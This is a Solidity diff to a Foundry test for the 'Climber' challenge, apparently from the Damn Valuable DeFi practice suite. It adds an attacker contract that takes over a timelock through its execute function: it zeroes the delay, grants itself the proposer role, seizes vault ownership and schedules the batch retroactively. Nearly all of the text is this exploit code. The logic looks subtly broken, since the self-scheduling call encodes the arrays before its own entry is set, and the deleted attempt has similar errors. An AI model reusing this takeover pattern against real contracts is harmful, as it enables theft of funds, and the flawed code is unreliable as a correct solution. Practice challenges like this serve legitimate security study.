@@ -8,6 +8,53 @@ import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
+contract ClimberAttacker {
+    ClimberVault vault;
+    ClimberTimelock timelock;
+
+    constructor(ClimberVault _vault, ClimberTimelock _timelock){
+        vault = _vault;
+        timelock = _timelock;
+    }
+   
+   function attack() external{
+
+        address[] memory targets = new address[](4); 
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+        bytes32 salt = bytes32(0);
+
+        targets[0] = address(timelock);
+        values[0] = 0;
+        dataElements[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
+
+        targets[1] = address(timelock);
+        values[1] = 0;
+        dataElements[1] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE,address(this));
+
+        targets[2] = address(vault);
+        values[2] = 0;
+        dataElements[2] = abi.encodeWithSelector(vault.transferOwnership.selector, address(this));
+
+        targets[3] = address(this);
+        values[3] = 0;
+        dataElements[3] = abi.encodeWithSelector(this.scheduleOperation.selector, targets,values,dataElements,salt);
+
+        timelock.execute(targets, values, dataElements, salt);
+        
+   }    
+
+    function scheduleOperation(
+        address[] memory _targets,
+        uint256[] memory _values,
+        bytes[] memory _dataElements,
+        bytes32 _salt
+    ) external {
+        timelock.schedule(_targets, _values, _dataElements, _salt);
+    } 
+        
+}
+
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -85,32 +132,8 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        address[] memory targets = new address[](4); 
-        uint256[] memory values = new uint256[](4);
-        bytes[] memory dataElements = new bytes[](4);
-        bytes32 memory salt = abi.encode(block.timestamp,msg.sender);
-
-        targets[0] = address(timelock);
-        values[0] = 0;
-        dataElements[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
-
-        targets[1] = address(timelock);
-        values[1] = 0;
-        dataElements[1] = abi.encodeWithSelector(timelock.grantRole.selector, timelock.PROPOSER_ROLE,address(this));
-
-        targets[2] = address(vault);
-        values[2] = 0;
-        dataElements[2] = abi.encodeWithSelector(vault.transferOwnership.selector, address(this));
-
-        targets[3] = address(this);
-        values[3] = 0;
-        dataElements[2] = abi.encodeWithSelector(timelock.schedule.selector, targets,values,dataElements,salt);
-
-
-
-
-
-
+        ClimberAttacker attacker = new ClimberAttacker(ClimberVault(vault),ClimberTimelock(timelock));
+        attacker.attack();
 
         // timelock.execute(targets, values, dataElements, salt);
     }
